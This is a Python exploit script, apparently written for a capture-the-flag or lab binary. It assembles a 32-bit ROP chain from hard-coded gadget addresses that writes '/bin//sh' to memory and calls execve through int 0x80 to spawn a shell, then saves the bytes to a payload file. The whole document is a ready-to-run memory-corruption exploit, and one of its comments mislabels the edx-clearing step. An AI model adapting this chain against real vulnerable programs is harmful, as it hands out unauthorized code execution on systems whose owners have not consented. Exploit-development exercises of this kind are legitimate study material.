from struct import pack
import os
data = 0x080e5020
xor_eax_eax = 0x080509f8 # xor eax, eax ; ret
pop_eax = 0x080ac75a # pop eax ; ret
pop_ebx = 0x08049022 # pop ebx ; ret
pop_ecx = 0x08054f4b # pop ecx ; add al, 0xf6 ; ret
pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
inc_eax = 0x0809d09e # inc eax ; ret
int_80 = 0x080499a2 # int 0x80
mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
xor_edx_edx = 0x0807b169 # xor edx, edx ; mov eax, edx ; ret
filler = 0x11111111
# Padding goes here
p = bytes('AAAAAAAAAAAABBBB', 'ascii')
 
p += pack('<I', pop_edx) # write address of .data into edx
p += pack('<I', data)
p += pack('<I', filler)
p += pack('<I', pop_eax) # write /bin into eax
p += bytes('/bin', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 4 into edx
p += pack('<I', data + 4)
p += pack('<I', filler)
p += pack('<I', pop_eax) # //sh into eax
p += bytes('//sh', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 8 into edx
p += pack('<I', data + 8)
p += pack('<I', filler)
p += pack('<I', xor_eax_eax) # clear eax
p += pack('<I', mov_edx_eax) # write null after /bin/sh
p += pack('<I', pop_ecx) # write arguments into ecx
p += pack('<I', data + 8)
p += pack('<I', xor_edx_edx) # write arguments into ecx
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload', 'wb') as file:
    file.write(p)